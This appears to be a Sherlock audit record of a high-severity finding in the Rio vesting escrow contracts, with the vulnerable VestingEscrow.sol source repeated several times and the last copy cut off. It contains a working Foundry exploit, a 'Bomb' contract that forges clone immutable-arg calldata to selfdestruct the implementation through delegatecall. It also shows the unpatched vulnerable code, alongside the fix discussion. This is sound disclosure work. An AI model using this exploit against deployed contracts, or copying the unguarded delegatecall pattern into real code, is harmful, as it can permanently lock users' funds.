{
  "Title": "H-1: Vaults can be bricked by `selfdestruct()`ing implementations, using forged immutable args",
  "Content": "# Issue H-1: Vaults can be bricked by `selfdestruct()`ing implementations, using forged immutable args \n\nSource: https://github.com/sherlock-audit/2024-01-rio-vesting-escrow-judging/issues/60 \n\n## Found by \n0xLogos, IllIllI, fugazzi, zzykxx\n## Summary\n\nThe clone-with-immutable-args pattern is unsafe to use when one of the immutable arguments controls an address being delegated to.\n\n\n## Vulnerability Detail\n\nAs was seen in the Astaria beacon proxy [issue](https://x.com/apoorvlathey/status/1671308196743647232?s=20), an attacker is able to forge the calldata that the proxy normally would forward, and can cause the implementation to `selfdestruct()` itself via a `delegatecall()`. The current code has a very similar vulnerability, in that every escrow performs a `delegatecall()` to an address coming from the factory, which is a forgeable immutable argument.\n\n\n## Impact\n\nBy creating a fake `IVotingAdaptor`, and providing properly-formatted calldata to the implementation contract being passed to each factory, an attacker can gain control via the `delegatecall()` in order to `selfdestruct()` each of the factories' implementations, preventing each factory's escrows from functioning further, including the withdrawal of tokens by any party.\n\n\n## Code Snippet\n\nThe `factory()` function gets its value from an immutable argument:\n```solidity\n// File: src/VestingEscrow.sol : VestingEscrow.factory()   #1\n\n18        /// @notice The factory that created this VestingEscrow instance.\n19        function factory() public pure returns (IVestingEscrowFactory) {\n20            return IVestingEscrowFactory(_getArgAddress(0));\n21:       }\n```\nhttps://github.com/sherlock-audit/2024-01-rio-vesting-escrow/blob/main/rio-vesting-escrow/src/VestingEscrow.sol#L18-L21\n\nwhose subsequent [responses](https://github.com/sherlock-audit/2024-01-rio-vesting-escrow/blob/main/rio-vesting-escrow/src/VestingEscrow.sol#L234-L236) end up being used with `delegatecall()`s:\n```solidity\n// File: src/VestingEscrow.sol : VestingEscrow.vote()   #2\n\n152        /// @notice Participate in a governance vote using all available tokens on the contract's balance.\n153        /// @param params The ABI-encoded data for call. Can be obtained from VotingAdaptor.encodeVoteCalldata.\n154        function vote(bytes calldata params) external onlyRecipient whenVotingAdaptorIsSet returns (bytes memory) {\n155            return _votingAdaptor().functionDelegateCall(abi.encodeCall(IVotingAdaptor.vote, (params)));\n156:       }\n```\nhttps://github.com/sherlock-audit/2024-01-rio-vesting-escrow/blob/main/rio-vesting-escrow/src/VestingEscrow.sol#L152-L156\n\n```solidity\n// File: src/adaptors/OZVotingAdaptor.sol : OZVotingAdaptor.delegate()   #3\n\n55        /// @notice Delegate votes.\n56        /// @param params The ABI-encoded delegatee address.\n57        function delegate(bytes calldata params) external {\n58            IVotes(votingToken).delegate(abi.decode(params, (address)));\n59:       }\n```\nhttps://github.com/sherlock-audit/2024-01-rio-vesting-escrow/blob/main/rio-vesting-escrow/src/adaptors/OZVotingAdaptor.sol#L55-L59\n\n## Tool used\n\nManual Review\n\n\n## Recommendation\n\nUse a state/contract variable for anything requiring being delegated to.\n\n\n## PoC\n\nBecause of a [foundry bug](https://github.com/foundry-rs/foundry/issues/1543) the test is not able to show the end result of the `selfdestruct()`, so I've added a print statement\n```diff\ndiff --git a/rio-vesting-escrow/test/VestingEscrow.t.sol b/rio-vesting-escrow/test/VestingEscrow.t.sol\nindex eafb7dc..55c95a8 100644\n--- a/rio-vesting-escrow/test/VestingEscrow.t.sol\n+++ b/rio-vesting-escrow/test/VestingEscrow.t.sol\n@@ -6,6 +6,20 @@ import {IVestingEscrow} from 'src/interfaces/IVestingEscrow.sol';\n import {OZVotingAdaptor} from 'src/adaptors/OZVotingAdaptor.sol';\n import {ERC20NoReturnToken} from 'test/lib/ERC20NoReturnToken.sol';\n import {ERC20Token} from 'test/lib/ERC20Token.sol';\n+import {console} from 'forge-std/Test.sol';\n+\n+contract Bomb {\n+    function attack(address impl) external {\n+        (bool success, ) = impl.call(abi.encodePacked(bytes4(keccak256(\"vote(bytes)\")), bytes32(0), address(this), address(this), address(this), uint40(block.timestamp), uint40(block.timestamp + 1), uint40(0), uint40(1), uint16(82)));\n+        require(success);\n+    }\n+    function votingAdaptor() external view returns (address) { return address(this); } function factory() external view returns (address) { return address(this); } function recipient() external view returns (address) { return address(this); }\n+    function vote(bytes calldata) external {\n+        console.log(\"bomb is being delegatecall()ed to; calling selfdestruct()\");\n+        selfdestruct(payable(address(0)));\n+    }\n+}\n+\n \n contract VestingEscrowTest is TestUtil {\n     function setUp() public {\n@@ -586,9 +600,11 @@ contract VestingEscrowTest is TestUtil {\n         deployedVesting.revokeAll();\n     }\n \n-    function testRevokeAll() public {\n+    function testRevokeAllBomb() public {\n         uint256 ownerBalance = token.balanceOf(factory.owner());\n \n+        new Bomb().attack(address(vestingEscrowImpl));\n+\n         vm.prank(factory.owner());\n         deployedVesting.revokeAll();\n \ndiff --git a/rio-vesting-escrow/test/lib/TestUtil.sol b/rio-vesting-escrow/test/lib/TestUtil.sol\nindex 8667ef4..68c60ec 100644\n--- a/rio-vesting-escrow/test/lib/TestUtil.sol\n+++ b/rio-vesting-escrow/test/lib/TestUtil.sol\n@@ -39,6 +39,7 @@ contract TestUtil is Test {\n     OZVotingToken public token;\n \n     VestingEscrow public deployedVesting;\n+    VestingEscrow public vestingEscrowImpl;\n \n     uint256 public amount;\n     address public recipient;\n@@ -52,8 +53,9 @@ contract TestUtil is Test {\n         token = new OZVotingToken();\n         governor = new GovernorVotesMock(address(token));\n         ozVotingAdaptor = new OZVotingAdaptor(address(governor), address(token), config.owner);\n+        vestingEscrowImpl = new VestingEscrow();\n         factory = new VestingEscrowFactory(\n-            address(new VestingEscrow()), address(token), config.owner, config.manager, address(ozVotingAdaptor)\n+            address(vestingEscrowImpl), address(token), config.owner, config.manager, address(ozVotingAdaptor)\n         );\n \n         vm.deal(RANDOM_GUY, 100 ether);\n```\n\noutput:\n```text\n% forge test --match-test testRevokeAllBomb -vvv\n[â ¢] Compiling...\nNo files changed, compilation skipped\n\nRunning 1 test for test/VestingEscrow.t.sol:VestingEscrowTest\n[PASS] testRevokeAllBomb() (gas: 342335)\nLogs:\n  bomb is being delegatecall()ed to; calling selfdestruct()\n\nTest result: ok. 1 passed; 0 failed; 0 skipped; finished in 9.79ms\n```\n\n\n\n\n## Discussion\n\n**solimander**\n\nAcknowledged ðŸ‘ \n\n**sherlock-admin2**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**pratraut** commented:\n> 'invalid due to owner who is deploying escrow contract is TRUSTED entity'\n\n\n\n**solimander**\n\nI believe this is valid. Forging of calldata variables will allow anyone to bypass protections and `selfdestruct` the implementation contract.\n\n**solimander**\n\nNot sure if I'm jumping the gun here, but fixed in https://github.com/rio-org/rio-vesting-escrow/pull/6\n\n**0xMR0**\n\n@solimander @nevillehuang \n\nIsn't this issue ONLY applicable to beacon proxy or ERC1967 proxy contracts? \n\nThe contracts are using clones(ERC-1167: Minimal Proxy Contract) and [per openzeppelin](https://docs.openzeppelin.com/contracts/4.x/api/proxy#UUPSUpgradeable-onlyProxy--),\n\n> onlyProxy()\nCheck that the execution is being performed through a delegatecall call and that the execution context is a proxy contract with an implementation (as defined in ERC1967) pointing to self. This should only be the case for UUPS and transparent proxies that are using the current contract as their implementation. Execution of a function through ERC1167 minimal proxies (clones) would not normally pass this test, but is not guaranteed to fail.\n\ncode reference take from [here](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/proxy/utils/UUPSUpgradeable.sol)\n```solidity\n\n    /// @custom:oz-upgrades-unsafe-allow state-variable-immutable\n    address private immutable __self = address(this);\n\n\n\n    /**\n     * @dev Check that the execution is being performed through a delegatecall call and that the execution context is\n     * a proxy contract with an implementation (as defined in ERC-1967) pointing to self. This should only be the case\n     * for UUPS and transparent proxies that are using the current contract as their implementation. Execution of a\n     * function through ERC-1167 minimal proxies (clones) would not normally pass this test, but is not guaranteed to\n     * fail.\n     */\n    modifier onlyProxy() {\n        _checkProxy();\n        _;\n    }\n\n\n    /**\n     * @dev Reverts if the execution is not performed via delegatecall or the execution\n     * context is not of a proxy with an ERC-1967 compliant implementation pointing to self.\n     * See {_onlyProxy}.\n     */\n    function _checkProxy() internal view virtual {\n        if (\n            address(this) == __self || // Must be called through delegatecall\n            ERC1967Utils.getImplementation() != __self // Must be called through an active proxy\n        ) {\n            revert UUPSUnauthorizedCallContext();\n        }\n    }\n```\n\nsimilar modifier has been used by project team [here](https://github.com/rio-org/rio-vesting-escrow/pull/6/commits/9932073d6c0b4bfcc72961b647dd66a72b931ea5#diff-bad9934dc79f93bce7e10124cce6096927b8207510a9eff058f3217f10832803R19) as seen in pull request.\n\n\nCan you please check the issue is really with minimal proxies? if its possible, Not sure why the user i.e recipient will do this to stuck his own tokens since the functions are onlyRecipient protected? If it can be done by malicious owner then owner is trusted here? Or am i missing something or the context of above openzeppelin reference is misunderstood?\n\nThanks and appreciate the response.\n\n**detectiveking123**\n\nI believe this is a valid issue as well. It is a good catch. \n\n**solimander**\n\n> Can you please check the issue is really with minimal proxies? if its possible, Not sure why the user i.e recipient will do this to stuck his own tokens since the functions are onlyRecipient protected? If it can be done by malicious owner then owner is trusted here? Or am i missing something or the context of above openzeppelin reference is misunderstood?\n\nYou're misunderstanding somewhat. The problem is related to the fact that the \"immutable\" variables are actually calldata, and can therefore be forged when when calling the implementation contract directly. First, the attacker needs to bypass `onlyRecipient`, which they can do by setting the recipient (`_getArgAddress(40)`) to their address in the calldata. Then they call one of the three functions that delegate-calls `_votingAdaptor` (`delegate`, `vote`, or `voteWithReason`). `_votingAdaptor` can be faked via a forged `factory`. The fake `_votingAdaptor` then calls self-destruct and there goes the implementation contract. All escrows are bricked.\n\n**IllIllI000**\n\nThe [PR](https://github.com/rio-org/rio-vesting-escrow/pull/6) properly mitigates the issue by creating and using a new `onlyDelegateCall` modifier (similar to OZ's [version](https://github.com/OpenZeppelin/openzeppelin-upgrades/blob/2cf601497f7ff5bb9554d056e0b17725dbe64e7e/docs/modules/ROOT/pages/faq.adoc#can-i-safely-use-delegatecall-and-selfdestruct)) on the external `vote()` and `voteWithReason()` functions, as well as on the internal `_delegate()` function, which are the only functions making `delegatecall()`s from implementations, on results controlled by a `_getArgAddress()` internal function call. The new modifier is added to a new mixin which adds a new `immutable` `address` contract variable and sets it to the contract's own address during construction. The mixin is added to the vulnerable `VestingEscrow` contract's inheritance chain, and properly rejects any call coming from the contract by checking `address(this)` against the stored address, which correctly won't match for `delegatecall`s. The PR also adds the `delegate()`, `vote()`, and `voteWithReason()` functions from `VestingEscrow.sol` to `IVestingEscrow.sol`, and adds passing negative tests for the attack on each of those functions on the factory's implementation. There is no test for an attack on `initialize()`. The PR also updates the gas snapshot numbers. The clone itself (proxy) is not vulnerable, because it forwards all requests via `delegatecall()`, rather than relying on any of the implementation's code.\n\n**solimander**\n\nThanks @IllIllI000! I've added a test for an attack on initialize: https://github.com/rio-org/rio-vesting-escrow/pull/6/commits/a6544b174aff9b2ff766f7aece03b052ec2b7466\n\n\n",
  "Impact": "HIGH",
  "Source": "https://app.sherlock.xyz/audits/contests/159",
  "Code": [
    {
      "filename": "rio-vesting-escrow/src/VestingEscrow.sol",
      "content": "// SPDX-License-Identifier: GPL-3.0\npragma solidity 0.8.23;\n\nimport {Clone} from '@solady/utils/Clone.sol';\nimport {Math} from '@openzeppelin/contracts/utils/math/Math.sol';\nimport {Address} from '@openzeppelin/contracts/utils/Address.sol';\nimport {IERC20} from '@openzeppelin/contracts/token/ERC20/IERC20.sol';\nimport {SafeERC20} from '@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol';\nimport {IVestingEscrowFactory} from 'src/interfaces/IVestingEscrowFactory.sol';\nimport {IVestingEscrow} from 'src/interfaces/IVestingEscrow.sol';\nimport {IVotingAdaptor} from 'src/interfaces/IVotingAdaptor.sol';\n\ncontract VestingEscrow is IVestingEscrow, Clone {\n    using SafeERC20 for IERC20;\n    using Address for address;\n    using Address for address payable;\n\n    /// @notice The factory that created this VestingEscrow instance.\n    function factory() public pure returns (IVestingEscrowFactory) {\n        return IVestingEscrowFactory(_getArgAddress(0));\n    }\n\n    /// @notice The token.\n    function token() public pure returns (IERC20) {\n        return IERC20(_getArgAddress(20));\n    }\n\n    /// @notice The token recipient.\n    function recipient() public pure returns (address) {\n        return _getArgAddress(40);\n    }\n\n    /// @notice The vesting start timestamp.\n    function startTime() public pure returns (uint40) {\n        return _getArgUint40(60);\n    }\n\n    /// @notice The vesting end timestamp.\n    function endTime() public pure returns (uint40) {\n        return _getArgUint40(65);\n    }\n\n    /// @notice The vesting cliff length.\n    function cliffLength() public pure returns (uint40) {\n        return _getArgUint40(70);\n    }\n\n    /// @notice The total amount of tokens locked.\n    function totalLocked() public pure returns (uint256) {\n        return _getArgUint256(75);\n    }\n\n    /// @notice The total amount of tokens that have been claimed.\n    uint256 public totalClaimed;\n\n    /// @notice The vesting end time or the time at which vesting was revoked.\n    uint40 public disabledAt;\n\n    /// @notice Whether vesting is fully revokable.\n    bool public isFullyRevokable;\n\n    /// @notice Whether vesting has been fully revoked.\n    bool public isFullyRevoked;\n\n    /// @notice Throws if called by any account other than the owner.\n    modifier onlyOwner() {\n        _checkOwner();\n        _;\n    }\n\n    /// @notice Throws if called by any account other than the owner or manager.\n    modifier onlyOwnerOrManager() {\n        _checkOwnerOrManager();\n        _;\n    }\n\n    /// @notice Throws if called by any account other than the recipient.\n    modifier onlyRecipient() {\n        _checkRecipient();\n        _;\n    }\n\n    /// @notice Throws if the voting adaptor is not set.\n    modifier whenVotingAdaptorIsSet() {\n        _checkVotingAdaptorIsSet();\n        _;\n    }\n\n    /// @notice Initializes the contract.\n    /// @param _isFullyRevokable Whether the tokens are fully revokable.\n    /// @param _initialDelegateParams The optional initial delegate information (skipped if empty bytes).\n    function initialize(bool _isFullyRevokable, bytes calldata _initialDelegateParams) external {\n        address _factory = address(factory());\n        uint256 _totalLocked = totalLocked();\n        uint40 _endTime = endTime();\n        IERC20 _token = token();\n\n        if (msg.sender != _factory) revert NOT_FACTORY(msg.sender);\n        if (_token.balanceOf(address(this)) < _totalLocked) revert INSUFFICIENT_BALANCE();\n\n        disabledAt = _endTime; // Set to maximum time\n        isFullyRevokable = _isFullyRevokable;\n\n        if (_initialDelegateParams.length != 0) _delegate(_initialDelegateParams);\n\n        emit VestingEscrowInitialized(\n            _factory,\n            recipient(),\n            address(_token),\n            _totalLocked,\n            startTime(),\n            _endTime,\n            cliffLength(),\n            _isFullyRevokable\n        );\n    }\n\n    /// @notice Get the number of unclaimed, vested tokens for recipient.\n    function unclaimed() public view returns (uint256) {\n        if (isFullyRevoked) return 0;\n\n        uint256 claimTime = Math.min(block.timestamp, disabledAt);\n        return _totalVestedAt(claimTime) - totalClaimed;\n    }\n\n    /// @notice Get the number of locked tokens for recipient.\n    function locked() public view returns (uint256) {\n        if (block.timestamp >= disabledAt) return 0;\n\n        return totalLocked() - _totalVestedAt(block.timestamp);\n    }\n\n    /// @notice Claim tokens which have vested.\n    /// @param beneficiary Address to transfer claimed tokens to.\n    /// @param amount Amount of tokens to claim.\n    function claim(address beneficiary, uint256 amount) external onlyRecipient returns (uint256) {\n        uint256 claimable = Math.min(unclaimed(), amount);\n        totalClaimed += claimable;\n\n        token().safeTransfer(beneficiary, claimable);\n        emit Claim(beneficiary, claimable);\n\n        return claimable;\n    }\n\n    /// @notice Delegate voting power of all available tokens.\n    /// @param params The ABI-encoded delegate params.\n    function delegate(bytes calldata params) external onlyRecipient returns (bytes memory) {\n        return _delegate(params);\n    }\n\n    /// @notice Participate in a governance vote using all available tokens on the contract's balance.\n    /// @param params The ABI-encoded data for call. Can be obtained from VotingAdaptor.encodeVoteCalldata.\n    function vote(bytes calldata params) external onlyRecipient whenVotingAdaptorIsSet returns (bytes memory) {\n        return _votingAdaptor().functionDelegateCall(abi.encodeCall(IVotingAdaptor.vote, (params)));\n    }\n\n    // forgefmt: disable-next-item\n    /// @notice Participate in a governance vote with a reason using all available tokens on the contract's balance.\n    /// @param params The ABI-encoded data for call. Can be obtained from VotingAdaptor.encodeVoteWithReasonCalldata.\n    function voteWithReason(bytes calldata params) external onlyRecipient whenVotingAdaptorIsSet returns (bytes memory) {\n        return _votingAdaptor().functionDelegateCall(abi.encodeCall(IVotingAdaptor.voteWithReason, (params)));\n    }\n\n    /// @notice Disable further flow of tokens and revoke the unvested part to owner.\n    function revokeUnvested() external onlyOwnerOrManager {\n        uint256 revokable = locked();\n        if (revokable == 0) revert NOTHING_TO_REVOKE();\n\n        disabledAt = uint40(block.timestamp);\n\n        token().safeTransfer(_owner(), revokable);\n        emit UnvestedTokensRevoked(msg.sender, revokable);\n    }\n\n    /// @notice Disable further flow of tokens and revoke all tokens to owner.\n    function revokeAll() external onlyOwner {\n        if (!isFullyRevokable) revert NOT_FULLY_REVOKABLE();\n        if (isFullyRevoked) revert ALREADY_FULLY_REVOKED();\n\n        uint256 revokable = locked() + unclaimed();\n        if (revokable == 0) revert NOTHING_TO_REVOKE();\n\n        isFullyRevoked = true;\n        disabledAt = uint40(block.timestamp);\n\n        token().safeTransfer(_owner(), revokable);\n        emit VestingFullyRevoked(msg.sender, revokable);\n    }\n\n    /// @notice Permanently disable full token revocation.\n    function permanentlyDisableFullRevocation() external onlyOwner {\n        if (!isFullyRevokable) revert NOT_FULLY_REVOKABLE();\n\n        isFullyRevokable = false;\n        emit FullRevocationPermanentlyDisabled(msg.sender);\n    }\n\n    /// @notice Recover any ERC20 token to the recipient.\n    /// @param token_ Address of the ERC20 token to recover.\n    /// @param amount Amount of tokens to recover.\n    function recoverERC20(address token_, uint256 amount) external {\n        uint256 recoverable = amount;\n        if (token_ == address(token())) {\n            uint256 available = token().balanceOf(address(this)) - (locked() + unclaimed());\n            recoverable = Math.min(recoverable, available);\n        }\n        if (recoverable > 0) {\n            IERC20(token_).safeTransfer(recipient(), recoverable);\n            emit ERC20Recovered(token_, recoverable);\n        }\n    }\n\n    /// @notice Recover any ETH to the recipient.\n    function recoverEther() external {\n        uint256 amount = address(this).balance;\n        if (amount > 0) {\n            payable(recipient()).sendValue(amount);\n            emit ETHRecovered(amount);\n        }\n    }\n\n    /// @dev Returns the factory owner.\n    function _owner() internal view returns (address) {\n        return factory().owner();\n    }\n\n    /// @dev Returns the factory manager.\n    function _manager() internal view returns (address) {\n        return factory().manager();\n    }\n\n    /// @dev Returns the factory voting adaptor.\n    function _votingAdaptor() internal view returns (address) {\n        return factory().votingAdaptor();\n    }\n\n    /// @dev Throws if called by any account other than the owner.\n    function _checkOwner() internal view {\n        if (msg.sender != _owner()) {\n            revert NOT_OWNER(msg.sender);\n        }\n    }\n\n    /// @dev Throws if called by any account other than the owner or manager.\n    function _checkOwnerOrManager() internal view {\n        if (msg.sender != _owner() && msg.sender != _manager()) {\n            revert NOT_OWNER_OR_MANAGER(msg.sender);\n        }\n    }\n\n    /// @dev Throws if called by any account other than the recipient.\n    function _checkRecipient() internal view {\n        if (msg.sender != recipient()) {\n            revert NOT_RECIPIENT(msg.sender);\n        }\n    }\n\n    /// @dev Throws if the voting adaptor is not set.\n    function _checkVotingAdaptorIsSet() internal view {\n        if (_votingAdaptor() == address(0)) {\n            revert VOTING_ADAPTOR_NOT_SET();\n        }\n    }\n\n    /// @notice Delegate voting power of all available tokens.\n    /// @param params The ABI-encoded delegate params.\n    function _delegate(bytes calldata params) internal whenVotingAdaptorIsSet returns (bytes memory) {\n        return _votingAdaptor().functionDelegateCall(abi.encodeCall(IVotingAdaptor.delegate, params));\n    }\n\n    /// @dev Returns the vested token amount at a specific time.\n    /// @param time The time to retrieve the vesting amount for.\n    function _totalVestedAt(uint256 time) internal pure returns (uint256) {\n        uint40 _startTime = startTime();\n        uint256 _totalLocked = totalLocked();\n        if (time < _startTime + cliffLength()) {\n            return 0;\n        }\n        return Math.min(_totalLocked * (time - _startTime) / (endTime() - _startTime), _totalLocked);\n    }\n}"
    },
    {
      "filename": "rio-vesting-escrow/src/VestingEscrow.sol",
      "content": "// SPDX-License-Identifier: GPL-3.0\npragma solidity 0.8.23;\n\nimport {Clone} from '@solady/utils/Clone.sol';\nimport {Math} from '@openzeppelin/contracts/utils/math/Math.sol';\nimport {Address} from '@openzeppelin/contracts/utils/Address.sol';\nimport {IERC20} from '@openzeppelin/contracts/token/ERC20/IERC20.sol';\nimport {SafeERC20} from '@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol';\nimport {IVestingEscrowFactory} from 'src/interfaces/IVestingEscrowFactory.sol';\nimport {IVestingEscrow} from 'src/interfaces/IVestingEscrow.sol';\nimport {IVotingAdaptor} from 'src/interfaces/IVotingAdaptor.sol';\n\ncontract VestingEscrow is IVestingEscrow, Clone {\n    using SafeERC20 for IERC20;\n    using Address for address;\n    using Address for address payable;\n\n    /// @notice The factory that created this VestingEscrow instance.\n    function factory() public pure returns (IVestingEscrowFactory) {\n        return IVestingEscrowFactory(_getArgAddress(0));\n    }\n\n    /// @notice The token.\n    function token() public pure returns (IERC20) {\n        return IERC20(_getArgAddress(20));\n    }\n\n    /// @notice The token recipient.\n    function recipient() public pure returns (address) {\n        return _getArgAddress(40);\n    }\n\n    /// @notice The vesting start timestamp.\n    function startTime() public pure returns (uint40) {\n        return _getArgUint40(60);\n    }\n\n    /// @notice The vesting end timestamp.\n    function endTime() public pure returns (uint40) {\n        return _getArgUint40(65);\n    }\n\n    /// @notice The vesting cliff length.\n    function cliffLength() public pure returns (uint40) {\n        return _getArgUint40(70);\n    }\n\n    /// @notice The total amount of tokens locked.\n    function totalLocked() public pure returns (uint256) {\n        return _getArgUint256(75);\n    }\n\n    /// @notice The total amount of tokens that have been claimed.\n    uint256 public totalClaimed;\n\n    /// @notice The vesting end time or the time at which vesting was revoked.\n    uint40 public disabledAt;\n\n    /// @notice Whether vesting is fully revokable.\n    bool public isFullyRevokable;\n\n    /// @notice Whether vesting has been fully revoked.\n    bool public isFullyRevoked;\n\n    /// @notice Throws if called by any account other than the owner.\n    modifier onlyOwner() {\n        _checkOwner();\n        _;\n    }\n\n    /// @notice Throws if called by any account other than the owner or manager.\n    modifier onlyOwnerOrManager() {\n        _checkOwnerOrManager();\n        _;\n    }\n\n    /// @notice Throws if called by any account other than the recipient.\n    modifier onlyRecipient() {\n        _checkRecipient();\n        _;\n    }\n\n    /// @notice Throws if the voting adaptor is not set.\n    modifier whenVotingAdaptorIsSet() {\n        _checkVotingAdaptorIsSet();\n        _;\n    }\n\n    /// @notice Initializes the contract.\n    /// @param _isFullyRevokable Whether the tokens are fully revokable.\n    /// @param _initialDelegateParams The optional initial delegate information (skipped if empty bytes).\n    function initialize(bool _isFullyRevokable, bytes calldata _initialDelegateParams) external {\n        address _factory = address(factory());\n        uint256 _totalLocked = totalLocked();\n        uint40 _endTime = endTime();\n        IERC20 _token = token();\n\n        if (msg.sender != _factory) revert NOT_FACTORY(msg.sender);\n        if (_token.balanceOf(address(this)) < _totalLocked) revert INSUFFICIENT_BALANCE();\n\n        disabledAt = _endTime; // Set to maximum time\n        isFullyRevokable = _isFullyRevokable;\n\n        if (_initialDelegateParams.length != 0) _delegate(_initialDelegateParams);\n\n        emit VestingEscrowInitialized(\n            _factory,\n            recipient(),\n            address(_token),\n            _totalLocked,\n            startTime(),\n            _endTime,\n            cliffLength(),\n            _isFullyRevokable\n        );\n    }\n\n    /// @notice Get the number of unclaimed, vested tokens for recipient.\n    function unclaimed() public view returns (uint256) {\n        if (isFullyRevoked) return 0;\n\n        uint256 claimTime = Math.min(block.timestamp, disabledAt);\n        return _totalVestedAt(claimTime) - totalClaimed;\n    }\n\n    /// @notice Get the number of locked tokens for recipient.\n    function locked() public view returns (uint256) {\n        if (block.timestamp >= disabledAt) return 0;\n\n        return totalLocked() - _totalVestedAt(block.timestamp);\n    }\n\n    /// @notice Claim tokens which have vested.\n    /// @param beneficiary Address to transfer claimed tokens to.\n    /// @param amount Amount of tokens to claim.\n    function claim(address beneficiary, uint256 amount) external onlyRecipient returns (uint256) {\n        uint256 claimable = Math.min(unclaimed(), amount);\n        totalClaimed += claimable;\n\n        token().safeTransfer(beneficiary, claimable);\n        emit Claim(beneficiary, claimable);\n\n        return claimable;\n    }\n\n    /// @notice Delegate voting power of all available tokens.\n    /// @param params The ABI-encoded delegate params.\n    function delegate(bytes calldata params) external onlyRecipient returns (bytes memory) {\n        return _delegate(params);\n    }\n\n    /// @notice Participate in a governance vote using all available tokens on the contract's balance.\n    /// @param params The ABI-encoded data for call. Can be obtained from VotingAdaptor.encodeVoteCalldata.\n    function vote(bytes calldata params) external onlyRecipient whenVotingAdaptorIsSet returns (bytes memory) {\n        return _votingAdaptor().functionDelegateCall(abi.encodeCall(IVotingAdaptor.vote, (params)));\n    }\n\n    // forgefmt: disable-next-item\n    /// @notice Participate in a governance vote with a reason using all available tokens on the contract's balance.\n    /// @param params The ABI-encoded data for call. Can be obtained from VotingAdaptor.encodeVoteWithReasonCalldata.\n    function voteWithReason(bytes calldata params) external onlyRecipient whenVotingAdaptorIsSet returns (bytes memory) {\n        return _votingAdaptor().functionDelegateCall(abi.encodeCall(IVotingAdaptor.voteWithReason, (params)));\n    }\n\n    /// @notice Disable further flow of tokens and revoke the unvested part to owner.\n    function revokeUnvested() external onlyOwnerOrManager {\n        uint256 revokable = locked();\n        if (revokable == 0) revert NOTHING_TO_REVOKE();\n\n        disabledAt = uint40(block.timestamp);\n\n        token().safeTransfer(_owner(), revokable);\n        emit UnvestedTokensRevoked(msg.sender, revokable);\n    }\n\n    /// @notice Disable further flow of tokens and revoke all tokens to owner.\n    function revokeAll() external onlyOwner {\n        if (!isFullyRevokable) revert NOT_FULLY_REVOKABLE();\n        if (isFullyRevoked) revert ALREADY_FULLY_REVOKED();\n\n        uint256 revokable = locked() + unclaimed();\n        if (revokable == 0) revert NOTHING_TO_REVOKE();\n\n        isFullyRevoked = true;\n        disabledAt = uint40(block.timestamp);\n\n        token().safeTransfer(_owner(), revokable);\n        emit VestingFullyRevoked(msg.sender, revokable);\n    }\n\n    /// @notice Permanently disable full token revocation.\n    function permanentlyDisableFullRevocation() external onlyOwner {\n        if (!isFullyRevokable) revert NOT_FULLY_REVOKABLE();\n\n        isFullyRevokable = false;\n        emit FullRevocationPermanentlyDisabled(msg.sender);\n    }\n\n    /// @notice Recover any ERC20 token to the recipient.\n    /// @param token_ Address of the ERC20 token to recover.\n    /// @param amount Amount of tokens to recover.\n    function recoverERC20(address token_, uint256 amount) external {\n        uint256 recoverable = amount;\n        if (token_ == address(token())) {\n            uint256 available = token().balanceOf(address(this)) - (locked() + unclaimed());\n            recoverable = Math.min(recoverable, available);\n        }\n        if (recoverable > 0) {\n            IERC20(token_).safeTransfer(recipient(), recoverable);\n            emit ERC20Recovered(token_, recoverable);\n        }\n    }\n\n    /// @notice Recover any ETH to the recipient.\n    function recoverEther() external {\n        uint256 amount = address(this).balance;\n        if (amount > 0) {\n            payable(recipient()).sendValue(amount);\n            emit ETHRecovered(amount);\n        }\n    }\n\n    /// @dev Returns the factory owner.\n    function _owner() internal view returns (address) {\n        return factory().owner();\n    }\n\n    /// @dev Returns the factory manager.\n    function _manager() internal view returns (address) {\n        return factory().manager();\n    }\n\n    /// @dev Returns the factory voting adaptor.\n    function _votingAdaptor() internal view returns (address) {\n        return factory().votingAdaptor();\n    }\n\n    /// @dev Throws if called by any account other than the owner.\n    function _checkOwner() internal view {\n        if (msg.sender != _owner()) {\n            revert NOT_OWNER(msg.sender);\n        }\n    }\n\n    /// @dev Throws if called by any account other than the owner or manager.\n    function _checkOwnerOrManager() internal view {\n        if (msg.sender != _owner() && msg.sender != _manager()) {\n            revert NOT_OWNER_OR_MANAGER(msg.sender);\n        }\n    }\n\n    /// @dev Throws if called by any account other than the recipient.\n    function _checkRecipient() internal view {\n        if (msg.sender != recipient()) {\n            revert NOT_RECIPIENT(msg.sender);\n        }\n    }\n\n    /// @dev Throws if the voting adaptor is not set.\n    function _checkVotingAdaptorIsSet() internal view {\n        if (_votingAdaptor() == address(0)) {\n            revert VOTING_ADAPTOR_NOT_SET();\n        }\n    }\n\n    /// @notice Delegate voting power of all available tokens.\n    /// @param params The ABI-encoded delegate params.\n    function _delegate(bytes calldata params) internal whenVotingAdaptorIsSet returns (bytes memory) {\n        return _votingAdaptor().functionDelegateCall(abi.encodeCall(IVotingAdaptor.delegate, params));\n    }\n\n    /// @dev Returns the vested token amount at a specific time.\n    /// @param time The time to retrieve the vesting amount for.\n    function _totalVestedAt(uint256 time) internal pure returns (uint256) {\n        uint40 _startTime = startTime();\n        uint256 _totalLocked = totalLocked();\n        if (time < _startTime + cliffLength()) {\n            return 0;\n        }\n        return Math.min(_totalLocked * (time - _startTime) / (endTime() - _startTime), _totalLocked);\n    }\n}"
    },
    {
      "filename": "rio-vesting-escrow/src/VestingEscrow.sol",
      "content": "// SPDX-License-Identifier: GPL-3.0\npragma solidity 0.8.23;\n\nimport {Clone} from '@solady/utils/Clone.sol';\nimport {Math} from '@openzeppelin/contracts/utils/math/Math.sol';\nimport {Address} from '@openzeppelin/contracts/utils/Address.sol';\nimport {IERC20} from '@openzeppelin/contracts/token/ERC20/IERC20.sol';\nimport {SafeERC20} from '@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol';\nimport {IVestingEscrowFactory} from 'src/interfaces/IVestingEscrowFactory.sol';\nimport {IVestingEscrow} from 'src/interfaces/IVestingEscrow.sol';\nimport {IVotingAdaptor} from 'src/interfaces/IVotingAdaptor.sol';\n\ncontract VestingEscrow is IVestingEscrow, Clone {\n    using SafeERC20 for IERC20;\n    using Address for address;\n    using Address for address payable;\n\n    /// @notice The factory that created this VestingEscrow instance.\n    function factory() public pure returns (IVestingEscrowFactory) {\n        return IVestingEscrowFactory(_getArgAddress(0));\n    }\n\n    /// @notice The token.\n    function token() public pure returns (IERC20) {\n        return IERC20(_getArgAddress(20));\n    }\n\n    /// @notice The token 